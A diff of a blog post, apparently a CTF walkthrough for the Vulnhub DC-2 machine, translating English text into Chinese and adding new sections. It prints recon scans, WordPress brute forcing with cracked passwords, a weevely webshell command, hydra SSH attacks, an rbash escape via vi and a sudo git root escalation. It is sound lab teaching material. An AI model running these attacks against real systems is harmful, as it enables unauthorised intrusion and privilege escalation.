@@ -5,17 +5,17 @@ categories: [pentest-learning,Vulnhub]
 tags: ctf 
 ---
 
-now have no more useless words.
+少废话
 
-we got a new machine to HACK now.
+我们现在又拿到一个机子玩了
 
-after two machine config well(one is my kali, one is DC2, they connect with NAT in VMPro16)
+等待两个机子配置良好之后(one is my kali, one is DC2,他们通过IPv4的nat方法转换地址)
 
 # SCAN and DISCOVERY
 
 ## discovery
 
-we use  the command in my frist article.
+我们接着使用第一篇DC-1文章中提示到的
 ```bash
 $ sudo arp-scan -l     
 [sudo] kali 的密码：
@@ -29,21 +29,21 @@ Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
 4 packets received by filter, 0 packets dropped by kernel
 Ending arp-scan 1.9.7: 256 hosts scanned in 1.960 seconds (130.61 hosts/sec). 4 responded
 ```
-explains it,my ip is 192.168.242.128
+解释一下,我的地址是 192.168.242.128
 
-then the target ip is 192.168.242.131
+目标地址是 192.168.242.131
 
 >tips
->so why i can sure of that?why the ip is must be it?
+>我是如何确定对方IP的?
 >
->one way we can scan all of them
+>一种方式是nmap全部扫一遍
 >
->next way is go on google ask why.now for the [article](https://zhuanlan.zhihu.com/p/130984945)
+>另一个方式是谷歌看看发生了啥 [article](https://zhuanlan.zhihu.com/p/130984945)
 
 
 ## scan
 
-then we nmap it. after a liitle bit wait we got.
+稍微等一下 再开启我们的nmap
 ```bash
 $ nmap -A 192.168.242.131    
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 06:24 EDT
@@ -59,39 +59,36 @@ PORT   STATE SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds
 ``` 
-OH,we got problem.
+看起来有点问题
 
-the nmap and our machine or our DNS server can't know who is DC-2
+实际上nmap并不认识dc-2是什么.dns上也不认识
 
-nmap says:http-title: Did not follow redirect to http://dc-2/
+nmap 说:http-title: Did not follow redirect to http://dc-2/
 
-so we should get a little bit help for it.
+nmap需要一点点小小的帮助
 
-we can...do like this
+我们也可以这么做
 ```bash
 sudo vim /etc/hosts
 ```
-amd we need add one line
+我们需要增加一行
 ```
 192.168.242.131	dc-2
 ```
-save it we need...
+现在保存它
 
-press <ESC> and  input 
+按下 <ESC> 并且输入 
 
 :wq
 
-then we nmap again
+再次nmap
 
 >tips:
 >
->Time is the biggest enemy of thieves
+>如果扫描使得在真实环境下渗透时间更多 可以尝试边浏览一下对方网页或者对方机器的端口
 >
->also we need save it
+>如22/21/80/443/445 
 >
->if scanning got very long time in real env.
->
->we can both turn up our web broswer
 
 
 ```bash
@@ -111,25 +108,22 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds
 ```
 
+总结一下 这是我们的nmap扫描结果
 
-we can got many informations about it.
+1 这是个wp网站
 
-1 is word press sites.
-
-2 is it got no service as ssh and other.
+2 我们并没有得到ssh口子
 
 ---
 
->tips: recommend a new scanner in linux machine 
->special to debian/kali
+>tips: 推荐一款linux下的扫描器
 >
->it`s the rustscan
+>RUSTSCAN
 >
 >[github.com/Rustscan/Rustscan](https://github.com/RustScan/RustScan)
 >
 >
->if we use this tools to scan the box we will get faster and more detail.
-
+>这个工具可以让我们扫描的更快更酷更好更详细
 
 ```bash
 $ rustscan 192.168.242.131 -- -A
@@ -225,14 +219,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
 ```
 
->look more faster and detail.
+>看起来又快又好
 
 ---
 ---
 
-so now we can go to thos site and  run wpscan  together.
+于此同时我们浏览上site 跑起wpscan
 
-in the broswer we got the frist flag....also emmmm,it's a hint.
+于是在浏览器中我们得到了第一个flag
 ```
 Flag 1:
 
@@ -245,9 +239,9 @@ Log in as one to see the next flag.
 If you can’t find it, log in as another.
 ```
 
-seems we need the useful password dictinary generator---CEWL
+他在说我们需要一个优秀的字典生成器---CEWL 来进行爆破
 
-but the must do is need to do.WPscan
+oh ..wpscan结果出来了
 
 ```bash
 $ wpscan --url http://dc-2/                     
@@ -343,29 +337,29 @@ Interesting Finding(s):
 
 ```
 
-O~K~,seems we got nothing more.
+O~K~,看起来我们得到以下的关键信息
 
-1 no vulnerable plugins but theme seems is out-of-data.
+1 没有漏洞插件和主题
 
-2 xmlrpc.php is on.the brute force is enable.
+2 xmlrpc.php 是存在而且可以直接access 这为我们爆破提供了良好的环境.
 
-3 no config backup leaks out.
+3 没有配置文件备份被泄露
 
-4 the wp version is low..but actually just because the machine is old.
+4 wp版本非常久 
 
 # hint:user,password bruteforce.
 
-ok now clear  our mind, sqy what we should do next.
+很好 现在清理一下我们的脑子 现在的提示应该是我们可以枚举用户和密码 来进行一次爆破.
 
-we need get user information and then according their name to create the password wordlists.
+因而我们需要用户的信息以及密码字典
 
-and seems their are many users in it.
+这看起来他就是一个多人多任务运动网站了
 
 ## get username 
 
-wordpress give us the function to fuzz out the users.and it`s very fast.
+wpscan和目标给我们很方便的枚举措施和枚举漏洞.
 
-we should say the magic words of it.
+xmlrpc以及wpscan -e u 
 
 ```
 $ wpscan --url http://dc-2/ -e u
@@ -473,33 +467,38 @@ Interesting Finding(s):
 [+] Memory used: 132.699 MB
 [+] Elapsed time: 00:00:02
 ```
-ok three users:admin,jerry,tom.
+很好 很有精神 三个用户一个admin 一个jerry 一个tom
 
-that will help us a lot.maybe we need see the article for more information?
+合着这是在玩猫和老鼠///
 
-bad idea..because i use the google translation..the result of auto-detcet is latin......for a bad language leaner i think that is not a good idea.
+嗯 这帮了我们一把.或许我们可以康康文章来获取一些信息?
+
+那可不是个好主意..在google翻译了一把之后 我发现事情没那么简单 这完全就是一篇篇拉丁文文章
+
+就连英语都不是那么擅长的我 成功自闭..
 
 ## get password
 
-ok now according to the hint:TO BE CEWL
+OK看到这个hint:TO BE CEWL
 
-i find the google of its usage and also man it.
+其实我们不难想到 通过cewl这个字典生成器来生成一个密码字典
+
+在man和google cwel的用法之后 我顺利的打出来如下的指令
 
 ```
 $ cewl http://dc-2/ -w wordlist.txt -d 10 --with-numbers  
 ```
 
-than it create an dictinary of this website.
+于是它产生了一串关于网页的字典.
 
-seems very short?
+似乎看起来有点短,但是或许能成呢?
 
-may be it works.
+于是我开开始使用这个字典进行暴力破解 -P可以很好的满足我们的需求
 
-so i run this command.the -P means use wordlist to bruteforce.
 ```bash
 wpscan --url http://dc-2/ -e u -P  wordlist.txt 
 ```
-the result is
+执行结果为
 ```
 _______________________________________________________________
          __          _______   _____
@@ -614,25 +613,23 @@ Trying admin / log Time: 00:00:29 <======     > (646 / 1121) 57.62%  ETA: ??:??:
 [+] Memory used: 150.766 MB
 [+] Elapsed time: 00:00:31
 ```
-if you coomand line is color high light as my kali.
+如果你的命令行像我一样有着高亮显示
 
-you will see the color red highlighting the username and password.
-
-they are
+你可以清晰的看到命令结果有一串特殊颜色的高亮显示
 ```
 [!] Valid Combinations Found:
  | Username: jerry, Password: adipiscing
  | Username: tom, Password: parturient
 ```
-success........
+成功爆破...
 
 # access
 
-after login two accont in http://dc-2/wp-login.php
+在尝试登陆两次 http://dc-2/wp-login.php 之后
 
-we can know the jerry mouse have higher level privillege.
+我们可以知道jerry的权限更高 甚至可以看到flag2 post
 
-and we see....
+他在 http://dc-2/index.php/flag-2/
 ```
 Flag 2:
 
@@ -640,27 +637,25 @@ If you can't exploit WordPress and take a shortcut, there is another way.
 
 Hope you found another entry point.
 ```
-ok it seems not  more ways?right?
+很好 现在对我这种noob来说看起来没有新路了
 
-emmm...so the question is become how we can exp one wordpress website with the console access?
+emmm...现在问题变成了如何利用这个wordpress或者找到第二个entry
 
-and even it got the shortcut on it,right?
-
-maybe we need more information?
+我想或许我还需要更多信息
 
 # get shell
 
-i think i know how to login it..
+我想我懂如何登陆了(然而事实上是错误的)
 
-do you remember our rustscan give us a result of ssh?
+还记得rustscan给我们的ssh端口吗
 
-do you remember our wordpress user and account and pass??
+以及被爆破出来了的用户名称和密码
 
-when i have no idea about how to exp wp.
+我依旧没有找到入侵wordpress的具体思路
 
-i try the ssh login.
+于是我尝试了一下使用ssh
 
-the command  i use is 
+我使用如下指令
 ```
 ssh -p 7744 jerry@192.168.242.131
 jerry@192.168.242.131's password: adipiscing
@@ -668,11 +663,9 @@ Permission denied, please try again.
 
 ```
 
-seems the mouse is very clever right?
+似乎老鼠jerry还是比较谨慎的,他并没有给予我们ssh的入口
 
-he didn`t give us chance to access the ssh,right?
-
-the tom didn`t do as the same.
+但是 tom猫就恰恰相反了
 
 ```
 $ ssh -p 7744  tom@192.168.242.131
@@ -687,14 +680,13 @@ permitted by applicable law.
 tom@DC-2:~$ ls
 flag3.txt  usr
 ```
+但是cat head tail常见的输出指令都被ban了
 
-but we still got the problem,the cat head tail command are all banned.
+经过测试唯一可行的指令成为了 less和echo
 
-but echo is not
-
-so we can do as
+因此我们可以..
 ``` bash
-tom@DC-2:~$ for line in $(<flag3.txt); do echo $line; done
+tom@DC-2:~$ for line in $(<flag3.txt); do echo $line; done #替代指令为 less
 Poor
 old
 Tom
@@ -715,9 +707,11 @@ he
 causes.
 ```
 
+
+
 ## collect more info
 
-do you remember the command in my frist [article](https://esonhugh.github.io/posts/DC1-walkthrough-learnning-notes/#level-up-your-permission) and it tips?
+还记得我在第一篇 [文章](https://esonhugh.github.io/posts/DC1-walkthrough-learnning-notes/#level-up-your-permission) 中说的和其中的一些小小的技巧?
 
 ``` bash
 tom@DC-2:~$ compgen -u
@@ -947,8 +941,292 @@ scp
 ls
 vi
 ```
-what a little poor Tom as the flag says.
+正如flag所说 tom非常可怜
+
+## scan_agian
+
+这时候我重开了我的扫描器,在世外高人的指导中 我发现 nmap只会扫描常见的1000个端口 所以导致了 端口发现和漏洞扫描做的不是很及时
+
+```
+└─$ sudo rustscan 192.168.242.131 --ulimit 5000 -- -A --script vuln                                                             1 ⨯
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+Faster Nmap scanning with Rust.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Real hackers hack time ⌛
+
+[~] The config file is expected to be at "/root/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5000.
+Open 192.168.242.131:80
+Open 192.168.242.131:7744
+[~] Starting Nmap
+[>] The Nmap command to be run is nmap -A --script vuln -vvv -p 80,7744 192.168.242.131
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-22 02:59 EDT
+NSE: Loaded 149 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 02:59
+Completed NSE at 02:59, 10.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 02:59
+Completed NSE at 02:59, 0.00s elapsed
+Initiating ARP Ping Scan at 02:59
+Scanning 192.168.242.131 [1 port]
+Completed ARP Ping Scan at 02:59, 0.04s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 02:59
+Scanning dc-2 (192.168.242.131) [2 ports]
+Discovered open port 80/tcp on 192.168.242.131
+Discovered open port 7744/tcp on 192.168.242.131
+Completed SYN Stealth Scan at 02:59, 0.04s elapsed (2 total ports)
+Initiating Service scan at 02:59
+Scanning 2 services on dc-2 (192.168.242.131)
+Completed Service scan at 02:59, 6.04s elapsed (2 services on 1 host)
+Initiating OS detection (try #1) against dc-2 (192.168.242.131)
+NSE: Script scanning 192.168.242.131.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 02:59
+NSE Timing: About 82.31% done; ETC: 03:00 (0:00:13 remaining)
+Completed NSE at 03:00, 81.59s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 03:00
+Completed NSE at 03:00, 0.07s elapsed
+Nmap scan report for dc-2 (192.168.242.131)
+Host is up, received arp-response (0.00012s latency).
+Scanned at 2020-10-22 02:59:23 EDT for 89s
+
+PORT     STATE SERVICE REASON         VERSION
+80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=dc-2
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://dc-2:80/index.php/what-we-do/%5c%22
+|     Form id: search-form-5f919e943a000
+|     Form action: http://dc-2/
+|     
+|     Path: http://dc-2:80/index.php/flag/%5c%22
+|     Form id: search-form-5f919e94bb3ff
+|_    Form action: http://dc-2/
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /wp-login.php: Possible admin folder
+|   /readme.html: Wordpress version: 2 
+|   /: WordPress version: 4.7.10
+|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
+|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
+|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
+|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
+|   /wp-login.php: Wordpress login page.
+|   /wp-admin/upgrade.php: Wordpress login page.
+|_  /readme.html: Interesting, a readme.
+|_http-jsonp-detection: Couldn't find any JSONP endpoints.
+|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-wordpress-users: 
+| Username found: admin
+| Username found: tom
+| Username found: jerry
+|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
+|_https-redirect: ERROR: Script execution failed (use -d to debug)
+7744/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+MAC Address: 00:0C:29:C6:C1:A4 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/22%OT=80%CT=%CU=39567%PV=Y%DS=1%DC=D%G=N%M=000C29%T
+OS:M=5F912E24%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=103%TI=Z%CI=I%II=I
+OS:%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
+OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
+OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
+OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
+OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
+OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
+OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
+OS:N%T=40%CD=S)
+
+Uptime guess: 0.010 days (since Thu Oct 22 02:46:02 2020)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms dc-2 (192.168.242.131)
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 03:00
+Completed NSE at 03:00, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 03:00
+Completed NSE at 03:00, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 99.63 seconds
+           Raw packets sent: 25 (1.894KB) | Rcvd: 17 (1.366KB)
+```
+
+看起来没什么问题 一个csrf请求漏洞 剩下的啥也没有
+
+渗透又渐渐陷入僵局
+
+## surf_again and failure
+
+又开始无事浏览网站中
+
+我看到press this插件 正在尝试一波用图片木马进行一波钓鱼
+
+但是weevely生成php木马后 转换为.php.jpg格式尝试上传
+
+```
+weevely generate s3cr3t ~/Path
+```
+
+然而 打开网页之后他会提示我
+
+Unable to create directory wp-content/uploads/2020/10. Is its parent directory writable by the server?
+
+于是 失败~
+
+最后又尝试了一波hydra 的在线ssh密码爆破 
+
+```
+hydra -l jerry -P password.txt ssh://192.168.242.131:774
+hydra -l root -P password.txt ssh://192.168.242.131:7744
+```
+
+都以失败而告终
+
+我们唯一的希望在于我们的tom ssh 的rbash
+
+# rechallenge rbash
+
+在历经千难万险之后 在[gtfobins vi pump shell](https://gtfobins.github.io/gtfobins/vi/) 寻找到了我们最终的归属
+
+其中方法a是被不允许的
+
+只能使用方法b escape 受约束的环境
+
+方法如下
+
+```
+vi 				#在command的vi模式下
+:set shell=/bin/sh
+:shell
+```
+就可以直接进入不受约束的bash
+
+为什么一定可以?
+
+之前我们调用过一次 compgen -c这条命令 给我们展示出来 我们可以执行的指令 很多都是不受约束的
+
+但是现在尽管已经弹出了shell
+
+很多指令依旧受到限制 显示为 command not found
+
+理应已经解除限制的指令依旧受到约束 通过echo $PATH等展现环境变量的指令
+
+我们不难发现我们的PATH是缺失的
+
+于是..
+```
+export $PATH=/bin:/usr/bin:$PATH
+export $SHELL=/bin/bash:$SHELL
+```
+
+这是最难的一关
+
+之前通过less或者echo出来的hint可以知道 
+
+他是在提示我们换用户账号
+
+于是
+```
+su jerry
+Password:#此处的password填写之前爆破出来的jerry 密码 这里依旧存在密码复用 
+#尽管登陆用户密码是相同的但是由于jerry没有设置ssh导致我们无法使用ssh来登陆他
+```
+
+很好 现在切换到了jerry用户
+
+按照惯例
+
+```
+jerry@DC-2:/home/tom$ sudo -l
+Matching Defaults entries for jerry on DC-2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jerry may run the following commands on DC-2:
+    (root) NOPASSWD: /usr/bin/git
+
+jerry@DC-2:~$ cat *.txt
+Good to see that you've made it this far - but you're not home yet. 
+
+You still need to get the final flag (the only flag that really counts!!!).  
+
+No hints here - you're on your own now.  :-)
+
+Go on - git outta here!!!!
+```
+我们可以发现 我们可以root来使用git指令
+
+这和hint之前留下的信息git outta here!!! 一致
+
+(tom 可以通过使用less /home/jerry/\*.txt 来获得此条hint)
+
+通过查询文档 如GTFOBINS
+
+我们可以获得以下[指令](https://gtfobins.github.io/gtfobins/git/#sudo)
+
+我使用的是 help config的方法
+```
+sudo /usr/bin/git -p help config
+#此处你会看到:在闪烁 然后放心大胆的输入下面一行code就可以git
+shell 了
+
+!/bin/sh
+```
+
+# success
+
+最后胜利的喜悦
+
+```
+# ls
+flag4.txt
+# whoami
+root
+# cd /root
+# ls
+final-flag.txt
+# cat final-flag.txt
+ __    __     _ _       _                    _ 
+/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
+\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
+ \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
+  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   
 
 
+Congratulatons!!!
 
+A special thanks to all those who sent me tweets
+and provided me with feedback - it's all greatly
+appreciated.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+
+```
 
